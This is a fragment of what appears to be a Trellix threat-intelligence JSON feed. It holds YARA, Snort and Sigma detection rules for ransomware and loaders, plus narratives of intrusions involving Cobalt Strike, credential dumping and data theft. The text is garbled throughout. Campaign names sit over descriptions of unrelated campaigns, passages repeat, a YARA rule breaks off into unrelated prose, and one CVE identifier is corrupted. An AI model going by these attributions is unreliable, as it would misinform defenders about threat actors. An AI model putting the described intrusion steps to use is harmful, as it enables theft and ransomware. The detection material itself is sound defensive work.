T1059.001"}],"rule_type":null,"campaigns":[{"id":"f680e6c0-42ba-4935-bebe-08656b0a8898","name":"The Connection Between Black Basta Ransomware And The FIN7 Threat Group","description":"Researchers discovered previously unknown tools and techniques related to the Black Basta ransomware which have ties to the FIN7 threat group.

We have therefore included these in the BlackMatter event till further notice.","threat_level_id":1,"kb_article_link":null,"coverage":null,"updated_on":"2023-10-20T21:12:30.000Z","external_analysis":{"links":["https://www.bleepingcomputer.com/news/security/blackmatter-ransomware-gang-rises-from-the-ashes-of-darkside-revil/","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/csi-evidence-indicators-for-targeted-ransomware-attacks/","https://www.mcafee.com/blogs/enterprise/blackmatter-ransomware-analysis-the-dark-side-returns/","https://us-cert.cisa.gov/ncas/alerts/aa21-291a","https://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"]},"is_coat":0,"created_on":"2021-08-03T13:00:48.000Z"}]},{"id":"0a2cea5f-afc3-11eb-9d72-02d538d9640e","type":"yara","category":"Payload installation","value":"rule sig_3UDBUTNY7YstRc {\r\n   meta:\r\n      description = \"yara - file 3UDBUTNY7YstRc.tmp\"\r\n      date = \"2020-03-17\"\r\n      hash1 = \"a49133ed68bebb66412d3eb5d2b84ee71c393627906f574a29247d8699f1f38e\"\r\n   strings:\r\n      $x1 = \"cmd /c notepad.exe\" fullword ascii\r\n      $x2 = \"dllexec.dll\" fullword ascii\r\n      $s3 = \"cmd /c calc.exe\" fullword ascii\r\n      $s4 = \"Wordcnvpxy.exe\" fullword ascii\r\n      $s5 = \"GetOfficeData\" fullword ascii\r\n      $s6 = \"273<3]3b3\" fullword ascii /* Goodware String - occured 1 times */\r\n      $s7 = \"2>2K2W2_2g2s2\" fullword ascii /* Goodware String - occured 1 times */\r\n      $s8 = \"uTVWhY#\" fullword ascii\r\n      $s9 = \"DeleteOfficeData\" fullword ascii\r\n      $s10 = \"9#:=:N:\" fullword ascii /* Goodware String - occured 1 times */\r\n      $s11 = \"URPQQhpB\" fullword ascii\r\n      $s12 = \"6#6*626:6B6N6W6\\\\6b6l6u6\" fullword ascii /* Goodware String - occured 2 times */\r\n      $s13 = \"0#0-030I0N0V0\\\\0c0i0p0v0~0\" fullword ascii\r\n      $s14 = \"4.464<4F4L4V4\\\\4f4o4z4\" fullword ascii\r\n      $s15 = \"<$=1=;=I=R=\\\\=\" fullword ascii\r\n      $s16 = \">->3>9>O>g>\" fullword ascii\r\n      $s17 = \"5r5L6T6l6\" fullword ascii\r\n      $s18 = \"1#1*191>1D1M1m1s1\" fullword ascii\r\n      $s19 = \":%:K:Q:{:\" fullword ascii\r\n      $s20 = \"5(5L5X5\\\\5`5d5h5\" fullword ascii /* Goodware String - occured 4 times */\r\n   condition:\r\n      uint16(0) == 0x5a4d and filesize < 100KB and\r\n      ( pe.imphash() == \"abba83cce6a959dc431917a65c5fe7ca\" and ( pe.exports(\"DeleteOfficeData\") and pe.exports(\"GetOfficeData\") ) or ( 1 of ($x*) or 4 of them ) )\r\n}","comment":"","description":"An object describing a YARA rule (or a YARA rule name) along with its version.","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"9d599468-ad7c-11ea-9477-02d538d9640e","name":"PlugX Delivered By COVID-19 Themed Documents","description":"The PlugX remote access trojan is spread in a campaign with a COVID-19 theme.

It is highly configurable with capabilities that range from stealing sensitive data, encrypting files using either AES or ChaCha20 encryption (strong algorithms), ability to spread laterally, kill virtual machines and wipe snapshots to prevent recovery, all explained nicely from a \"--help\" page. The ransomware also includes a json configuration file that allows for extensive customization of extensions, ransom notes, encryption subroutines, file/folder/extension exclusions, and even processes to terminate.\r\n\r\nThe software is entirely written from scratch and does not use common templates which reduces the visibility of the samples since there are no leaked template samples to start detection from.\r\n\r\nOnce a victim has been infected the groups employing BlackCat use a triple-extortion tactic.

The analysis has uncovered that the breach lasted 11 days, and was initiated by a phishing email where a password protected malicious ISO Zipped file was shared. Once the victim unzipped the ISO and executed it, windows would mount it as a CD or external media, and the victim would be presented access to its contents, which in this case was a single file, named \"documents\". This file, when executed, also executes the hidden BumbleBee malware loader.\r\n\r\nOnce BumbleBee was fully up and running, it contacts its C2, where it kept for a while just communicating. The DFIR Report, reported that 3 hours later, the BumbleBee drops the first stage cobalt strike beacon. This beacon once executed it started to inject into other processes on the host. From these injected processes, the attackers then started the discovery and enumeration tasks. At the 4 hours mark from the initial access, the attacker RDP into a server with a local administrator account, downloaded AnyDesk to maintain persistence, and finally started the Active directory discovery using AdFind.\r\n\r\nIn the subsequent days the intruders dropped a number of tools to help with privilege escalation, although they had managed to move laterally to a number of workstations and one server, it did not seem they had the privileges they were searching for.\r\n\r\nOn the last day the attackers used PowerShell to download and run a new Cobalt Strike PowerShell Beacon, using this new beacon to inject into processes and execute the PowerShell Invoke-Kerberoast module, to request a service account Kerberos ticket that would allow them to crack the password for the service account offline. The attackers also dropped two batch scripts with the purpose of identifying all online servers and workstations in the environment.\r\n\r\nWith the cracked password of the service account the attackers were able to execute a Cobalt Strike beacon on a Domain Controller, but were shortly after evicted from the environment before they could apply the final actions which from their previous actions the indication was that it would be a domain wide ransom deployment.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

We have therefore included these in the BlackMatter event till further notice.","threat_level_id":1,"kb_article_link":null,"coverage":null,"updated_on":"2023-10-20T21:12:30.000Z","external_analysis":{"links":["https://www.bleepingcomputer.com/news/security/blackmatter-ransomware-gang-rises-from-the-ashes-of-darkside-revil/","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/csi-evidence-indicators-for-targeted-ransomware-attacks/","https://www.mcafee.com/blogs/enterprise/blackmatter-ransomware-analysis-the-dark-side-returns/","https://us-cert.cisa.gov/ncas/alerts/aa21-291a","https://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html"]},"is_coat":0,"created_on":"2021-08-03T13:00:48.000Z"}]},{"id":"0b91be99-327d-4aba-9550-18fb9d682c30","type":"vulnerability","category":"External analysis","value":"CVE-2017-11882","comment":"","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"140c1104-ad7e-11ea-9477-02d538d9640e","name":"Submarine Technologies Targeted","description":"The operation is suspected to have been carried out by the TEMP.PERISCOPE threat group, also known as Leviathan and MUDCARP.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools. Therefore, we strongly suggest to not only focus on the actual LockBit binary but to be aware of any suspicious behavior linked to any of the tools and Command-line arguments listed in this profile.","threat_level_id":1,"kb_article_link":null,"coverage":{"dat_version":{"min":4110},"linux_dat_version":{"min":5031}},"updated_on":"2023-07-11T05:11:49.000Z","external_analysis":{"links":["https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/tales-from-the-trenches-a-lockbit-ransomware-story/","https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/","https://www.cisa.gov/uscert/ncas/current-activity/2022/02/07/fbi-releases-indicators-compromise-associated-lockbit-20","https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit","https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/","https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/","https://www.cisa.gov/news-events/alerts/2023/06/14/cisa-and-partners-release-joint-advisory-understanding-ransomware-threat-actors-lockbit","https://www.cisa.gov/sites/default/files/2023-06/aa23-165a_understanding_TA_LockBit.pdf","https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a"]},"is_coat":1,"created_on":"2020-06-12T14:15:23.000Z"}]},{"id":"0c3f770f-b054-44bc-8c0f-c6d5b1756032","type":"yara","category":"Payload delivery","value":"rule Windows_Ransomware_Lockbit_369e1e94 {\r\n    meta:\r\n        author = \"Elastic Security\"\r\n        id = \"369e1e94-3fbb-4828-bb78-89d26e008105\"\r\n        fingerprint = \"9cf4c112c0ee708ae64052926681e8351f1ccefeb558c41e875dbd9e4bdcb5f2\"\r\n        creation_date = \"2022-07-05\"\r\n        last_modified = \"2022-07-18\"\r\n        threat_name = \"Windows.Ransomware.Lockbit\"\r\n        reference_sample = \"d61af007f6c792b8fb6c677143b7d0e2533394e28c50737588e40da475c040ee\"\r\n        severity = 100\r\n        arch_context = \"x86\"\r\n        scan_context = \"file, memory\"\r\n        license = \"Elastic License v2\"\r\n        os = \"windows\"\r\n    strings:\r\n        $a1 = { 66 83 F8 61 72 ?? 66 83 F8 66 77 ?? 66 83 E8 57 EB ?? 66 83 F8 30 72 ?? 66 83 F8 39 77 ?? 66 83 E8 30 EB ?? }\r\n        $a2 = { 8B EC 53 56 57 33 C0 8B 5D ?? 33 C9 33 D2 8B 75 ?? 8B 7D ?? 85 F6 74 ?? 55 8B 6D ?? 8A 54 0D ?? 02 D3 8A 5C 15 ?? 8A 54 1D ?? }\r\n        $a3 = { 53 51 6A ?? 58 0F A2 F7 C1 ?? ?? ?? ?? 0F 95 C0 84 C0 74 ?? 0F C7 F0 0F C7 F2 59 5B C3 6A ?? 58 33 C9 0F A2 F7 C3 ?? ?? ?? ?? 0F 95 C0 84 C0 74 ?? 0F C7 F8 0F C7 FA 59 5B C3 0F 31 8B C8 C1 C9 ?? 0F 31 8B D0 C1 C2 ?? 8B C1 59 5B C3 }\r\n        $b1 = { 6D 00 73 00 65 00 78 00 63 00 68 00 61 00 6E 00 67 00 65 00 00 00 73 00 6F 00 70 00 68 00 6F 00 73 00 }\r\n        $b2 = \"LockBit 3.0 the world's fastest and most stable ransomware from 2019\" ascii fullword\r\n        $b3 = \"http://lockbit\"\r\n        $b4 = \"Warning!

A user executed this JavaScript, which triggered a PowerShell script to install NetSupport and establish persistence in the system's registry. After five days, the threat actor conducted reconnaissance and tried to reactivate a disabled domain admin account. They also installed an OpenSSH server for persistence and established a reverse SSH tunnel to their server on a VPS.\r\n\r\nUsing the tunnel, they connected to the domain controller, used Impacket tools for discovery, and changed firewall settings on a remote server. They furthered lateral movement using Impackets wmiexec.py, deploying NetSupport malware to remote hosts. They scheduled tasks for persistence and issued discovery commands.\r\n\r\nThe next day, they deployed NetSupport on a domain controller and dumped the NTDS.dit database, likely exfiltrating it. They repeated this on another domain controller, ran an Active Directory auditing tool, and added a new account with admin privileges. They accessed the server via RDP and proceeded to disable Microsoft Defender, dump LSASS, and extract Windows event logs.

Over the Memorial Day weekend in the US, Volexity conducted an incident response with some of its clients due to the detection of suspicious activity. The activity was of webshells being written to disk, and the analysis uncovered that this access had stemmed from a vulnerability being exploited that resulted in remote code execution. Following the discovery and verification, Atlassian was informed and later confirmed that indeed its software contained a vulnerability. Since then, the vulnerability has officially been assigned the identifier CVE-2022-26134.\r\n\r\nThe vulnerability allows unauthenticated remote code execution on the server where Confluence is installed. The attacker is believed to exploit the shell by sending a specially crafted packet that contains the command to be executed. The attacker then loaded \"Behinder\" webshell directly into memory, so it does not need to keep exploiting the vulnerability in subsequent interactions. This webshell runs fully in memory and so it does not survive reboots. For this reason, attackers used the in memory webshell to download and write to disk two other webshells, China Chopper and a custom file upload webshells, in case the victims rebooted the server.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Once the file is chosen, this tool allows the user to select a target file extension for conversion. Once the fake conversion is finished, it redirects to a download page, where the user can download it as a zip archive file, named \"YourConvertedFile634643.zip\". This zip archive contains a shortcut file instead of the actual file. When that shortcut file is executed, it downloads and concatenates two unique bat files, namely \"2.bat\" and \"3.bat\" into the Downloads directory using curl, and launches the final batch file named 3.bat.\r\n\r\nThe final payload is downloaded from \"3.bat\" which further downloads an executable known as Redline Stealer, a piece of Malware in C# that utilizes SOAP API to communicate with its command and control (C2) server. The threat actor behind RedLine Stealer is active and is selling it as a Malware as a service (MaaS) architecture. This stealer can steal information from many sources, such as web browsers, cryptocurrency wallets, and applications such as Telegram, VPN clients, Discord, and FileZilla. It also collects information about the infected machine, can upload and download files, execute commands, and periodically sends information about the infected computer to the C2 server.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

The analysis has uncovered that the breach lasted 11 days, and was initiated by a phishing email where a password protected malicious ISO Zipped file was shared. Once the victim unzipped the ISO and executed it, windows would mount it as a CD or external media, and the victim would be presented access to its contents, which in this case was a single file, named \"documents\". This file, when executed, also executes the hidden BumbleBee malware loader.\r\n\r\nOnce BumbleBee was fully up and running, it contacts its C2, where it kept for a while just communicating. The DFIR Report, reported that 3 hours later, the BumbleBee drops the first stage cobalt strike beacon. This beacon once executed it started to inject into other processes on the host. From these injected processes, the attackers then started the discovery and enumeration tasks. At the 4 hours mark from the initial access, the attacker RDP into a server with a local administrator account, downloaded AnyDesk to maintain persistence, and finally started the Active directory discovery using AdFind.\r\n\r\nIn the subsequent days the intruders dropped a number of tools to help with privilege escalation, although they had managed to move laterally to a number of workstations and one server, it did not seem they had the privileges they were searching for.\r\n\r\nOn the last day the attackers used PowerShell to download and run a new Cobalt Strike PowerShell Beacon, using this new beacon to inject into processes and execute the PowerShell Invoke-Kerberoast module, to request a service account Kerberos ticket that would allow them to crack the password for the service account offline. The attackers also dropped two batch scripts with the purpose of identifying all online servers and workstations in the environment.\r\n\r\nWith the cracked password of the service account the attackers were able to execute a Cobalt Strike beacon on a Domain Controller, but were shortly after evicted from the environment before they could apply the final actions which from their previous actions the indication was that it would be a domain wide ransom deployment.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

This malware was found on compromised computers within the organization. MataDoor was designed to be stealthy, with executable file names similar to legitimate software and valid digital signatures. It also employed the Themida protector to evade detection.\r\n\r\nAnalysis of MataDoor revealed it to be a sophisticated modular backdoor. It is believed that the malware was introduced into the system through a phishing email that contained a DOCX document. This document exploited the CVE-2021-40444 vulnerability, suggesting that it was the initial entry point for the backdoor.\r\n\r\nMataDoor operates as a DLL and exports both the DllMain and DllRegisterServer functions. This allows the malware to run when invoked through the standard Windows Regsvr32 program. Essentially, these functions serve the same purpose, initializing the backdoor and executing its main logic in a separate thread.\r\n\r\nIn all known cases, MataDoor relies on a loader service to run, which automatically starts with the system, ensuring the backdoor's persistence. This loader service simply launches the backdoor DLL, and its configuration, like that of the backdoor, is encrypted using the AES algorithm in cipher feedback (CFB) mode.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key.

This on by itself is already an interesting development, but the following weeks other websites with connections to the Middle East started to be targeted. With the domain serving malicious javascript, ESET was able to trace the start of the campaign to March 2020 when the domain was registered, although the actual compromises only started April 2020. At the end of July, up to the beginning of August, the campaign ended and the attacker cleaned the compromised websites of any malicious scripts.\r\n\r\nThe threat group went quiet until January 2021, when a new wave of compromises was observed. This new wave lasted until August 2021, where all websites were cleaned once more. Although these are public websites, the intended targets are believed to be specific visitors. These attacks have been associated with a Kaspersky-tracked group, which has been named Karkadann. The attacks have also been linked to an Israeli spyware firm by the name of Candiru.\r\n\r\nAt the moment of writing, the groups has once again gone into hiding, most likely redesigning its tooling and techniques to improve its stealth for future campaigns.\r\n\r\nMcAfee’s ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"0e51e87c-b8f0-4d9d-9354-95ddfa48180f","type":"snort","category":"Network activity","value":"alert tcp any 80 -> any any (msg:\"Non-Std TCP Client Traffic contains PowerView Script Download String\"; sid:1; rev:1; flow:established,from_server; content:\"PowerView.ps1\"; content:\"PSReflect/master/PSReflect.psm1\"; fast_pattern:only; content:\"function New-InMemoryModule\"; metadata:service else-ports;)","comment":"Snort Detection Signature","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"19a88c9b-04f7-11eb-9477-02d538d9640e","name":"Threat Profile: TrickBot Banker","description":"TrickBot is one of the most popular type of trojan.

Nothing like coming back to the cyber world screeching about intelligence leaks, critical vulnerabilities, and breaches. It’s as if we should be asking “who has not been breached these days?” 3CX made the news early in April via a supply chain attack, Uber’s driver data was stolen via the breach on Genova Burns LLC and now MSI has been compromised. Fear not! It’s not all doom and gloom, as the Trellix Advanced Research Center helped take down one of the largest online markets for illegal activities and content.\r\n\r\nOrganizations looking to avoid having their names wind up in similar headlines have come to the right place, as the Bug Report promises to the answer the questions, “What is it?” “Who cares?” and “What can I do?” for the top vulnerabilities each month. As promised, let’s say hello to this month’s list of faulty bugs!\r\n\r\nCVE-2023-28205: macOS, iOS, iPadOS, and Safari\r\nCVE-2023-29389: 2021 Toyota RAV4\r\nCVE-2023-2825%WINDIR%\\Common Log File System (CLFS)\r\nCVE-2023-2033: Google Chrome and Chromium\r\n\r\n\r\nCVE-2023-28205: One bite of the Apple\r\n\r\nWhat is it?\r\n\r\nLooks like Google’s Clément Lecigne is on a roll with Apple-related CVEs, this being his third major find in just two years. This vulnerability is a use-after-free in Webkit, a browser engine used in Safari, iOS, iPadOS, and macOS to render online content. The vuln can be triggered via a malicious HTML page embedded with a JavaScript payload, leading to arbitrary code execution with elevated privileges.\r\n\r\nWho cares?\r\n\r\nA wide range of devices running iOS, iPadOS, Safari, and macOS are vulnerable, placing the majority of Apple’s customers firmly in the “I care” column. You may be surprised to learn that the iPod Touch was among the vulnerable products that have been patched. Frankly, I had to research if iPods are still even a thing—I must be getting old.\r\n\r\nIt should also be noted that the researchers who reported this bug to Apple apparently discovered it being used in the wild, although neither they nor Apple have released any details regarding the nature of this exploitation as of yet.\r\n\r\nWhat can I do?\r\n\r\nThankfully, Apple has already patched this vulnerability with the release of versions 15.7.5 and 16.4.1 for iOS, iPadOS, and Safari and the release of macOS Ventura 13.3.1. If you’ve somehow survived this long without knowing how to update your Apple devices, Apple provides support pages on how to accomplish this for both mobile and desktop.\r\n\r\n\r\nCVE-2023-29389: 2021 Toyota RAV4, now with keyless entry\r\n\r\nWhat is it?\r\n\r\nAt the risk of sounding entitled, would it be possible for Toyota to ensure their vehicles don’t automatically trust messages from other ECUs via the CAN bus? Unfortunately, I don’t think the folks at Toyota can hear my request, since it’s still possible to use this type of attack on any 2021 Toyota RAV4 (and potentially other vehicles—see below). Simply access the headlight connector behind the bumper and send a \"Key is validated\" message via CAN injection, and now you can control the vehicle.\r\n\r\nKen Tindell, CTO of Canis Automotive Labs, and his friend Ian Tabor discovered this vulnerability after Ian’s RAV4 was stolen off the street back in July of last year after a couple of failed attempts in April, meaning criminals have been using this vulnerability for at least a year. In his blog, Ken notes that although the CVE description explicitly names the 2021 Toyota RAV4 as the vulnerable product, “this is not something specific to Toyota: Ian investigated the RAV4 because his stolen car was a RAV4, and other manufacturers have car models that can be stolen in a similar way.” In fact, the theft device they reverse-engineered to discover the vulnerability claims to support “Lexus models including the ES, LC, LS, NX, RX and Toyota models including the GR Supra, Prius, Highlander, Land Cruiser - and RAV4.”\r\n\r\nWho cares?\r\n\r\nIn 2021, Toyota sold 407,739 RAV4’s in the U.S alone. While it may not be assumed that all of those were 2021 models given how car release cycles are implemented, it is still a significant number of vehicles that may be vulnerable to CAN injection hijacking. If Ken Tindell’s claim that this vulnerability affects various other Lexus and Toyota models is to be believed, it’s possible this number could be in the millions. A threat actor compromising a vehicle via this method could endanger the public or the driver’s life—or, more likely, use it to unlock and steal the car right off the street in minutes.\r\n\r\nWhat can I do?\r\n\r\nCurrently there is no patch available from Toyota. So… secure your vehicle? Have it insured? Forgo electronic vehicles entirely? Jokes aside, without a patch from Toyota, your best bet is probably to avoid leaving your RAV4 on the street at night and park in the garage for the time being. If you need to park on the street, utilize a steering wheel lock to make your vehicle a less attractive target for carjackers.\r\n\r\n\r\nCVE-2023-28252: Gang Gang CLFS\r\n\r\nWhat is it?\r\n\r\nNothing like jumping into another zero-day found in the Windows driver for its Common Log File System (CLFS), which seems to be a common target for vulnerabilities as of late. For those that don’t know, CLFS is a subsystem utilized by both the kernel and user space applications to, among other things, log transactions to the disk in the form of a Base Log File.\r\n\r\nCVE-2023-28252 can be exploited by malforming the Base Log File’s fields enough to cause an out-of-bounds write when the driver processes it. Once the vulnerability is triggered, the attacker may use the exposed kernel structures to execute malicious code with system privileges.\r\n\r\nWho cares?\r\n\r\nDo you run Windows in enterprise environments? Maybe even just at home? If you own one of the billions of devices worldwide that run Windows, congratulations, you are vulnerable!\r\n\r\nTo be fair, the CLFS data structures are old and have had several vulnerabilities attributed to them since 2018. The pressing matter with this CVE is that it has been exploited in the wild by cybercriminals to deploy Nokoyawa ransomware.\r\n\r\nWhat can I do?\r\n\r\nGiven the fact that this vulnerability is being exploited in the wild to deliver ransomware, it is recommended to patch your systems as soon as possible. You can find the patch details here.\r\n\r\n\r\nCVE-2023-2033: V8 fragged out\r\n\r\nWhat is it?\r\n\r\nIt looks like Google’s Clément Lecigne isn’t content with finding bug after bug in Apple’s Webkit and has also set his sights on Google’s own V8 Javascript engine, used in Google Chrome and other Chromium-based browsers like Edge and Opera. CVE-2023-2033 is yet another type confusion bug in V8, this one affecting all versions of Chrome prior to 112.0.5616.121. Wow, that was a mouth full; maybe we can get a bit more streamlined with version numbers instead of APT naming conventions.\r\n\r\nWho cares?\r\n\r\nGoogle stated that it is aware this CVE has been exploited in the wild. Thus, I think most of us care at this point, whether we like it or not. I tried not to, but I somehow found myself using Google Chrome again. In fact, I now have 128 GB of RAM to safely use a window with a single tab in Chrome. Don’t act like Firefox is any better; I had so many plugins that I had to migrate it to one of those enterprise servers with a terabyte of RAM.\r\n\r\nWhat can I do?\r\n\r\nGiven that this vulnerability has been observed being exploited in the wild, the best course of action is to patch ASAP. You can start by consulting Google’s Chrome Releases for more details. According to the Chromium Security page, these releases also apply to the Chromium project and, by extension, Chromium-based browsers that aren’t Chrome.","threat_level_id":2,"kb_article_link":null,"coverage":null,"updated_on":"2023-05-09T14:57:58.000Z","external_analysis":{"links":["https://www.trellix.com/en-us/about/newsroom/stories/research/the-bug-report-april-2023-edition.html"]},"is_coat":0,"created_on":"2023-05-09T14:57:58.000Z"}]},{"id":"0eb47de4-047f-4353-aafc-0c33e5f24a89","type":"sigma","category":"Payload delivery","value":"title: vbc.exe execution.\r\ndescription: Detects use of vbc.exe as a living off the land technique.\r\nreferences:\r\n- https://tdm.socprime.com/tdm/info/VzehOmLNWfAB\r\n- https://lolbas-project.github.io/lolbas/Binaries/Vbc/\r\nauthor: Den iuzvyk\r\ndate: 2020/03/17\r\ntags:\r\n- attack.defense_evasion\r\n- attack.execution\r\n- attack.t1218\r\n- attack.t1127\r\nlevel: medium\r\nlogsource:\r\n  category: process_creation\r\n  product: windows\r\ndetection:\r\n  selection:\r\n    Image|endswith: \\vbc.exe\r\n  condition: selection","comment":"Detects use of vbc.exe as a living off the land technique.","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"75cd564d-12f5-422c-8b03-8f99cb7f71d5","name":"SmokeLoader Exploits Old Vulnerabilities To Drop zgRAT","description":"An attack campaign was discovered using SmokeLoader to deliver zgRAT through phishing emails with malicious attachments.

A user executed this JavaScript, which triggered a PowerShell script to install NetSupport and establish persistence in the system's registry. After five days, the threat actor conducted reconnaissance and tried to reactivate a disabled domain admin account. They also installed an OpenSSH server for persistence and established a reverse SSH tunnel to their server on a VPS.\r\n\r\nUsing the tunnel, they connected to the domain controller, used Impacket tools for discovery, and changed firewall settings on a remote server. They furthered lateral movement using Impackets wmiexec.py, deploying NetSupport malware to remote hosts. They scheduled tasks for persistence and issued discovery commands.\r\n\r\nThe next day, they deployed NetSupport on a domain controller and dumped the NTDS.dit database, likely exfiltrating it. They repeated this on another domain controller, ran an Active Directory auditing tool, and added a new account with admin privileges. They accessed the server via RDP and proceeded to disable Microsoft Defender, dump LSASS, and extract Windows event logs. Sensitive documents were accessed, and cleanup tasks were performed.\r\n\r\nThe final actions involved dropping Nim binaries to create a backdoor user, but this attempt failed.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools. Therefore, we strongly suggest to not only focus on the actual LockBit binary but to be aware of any suspicious behavior linked to any of the tools and Command-line arguments listed in this 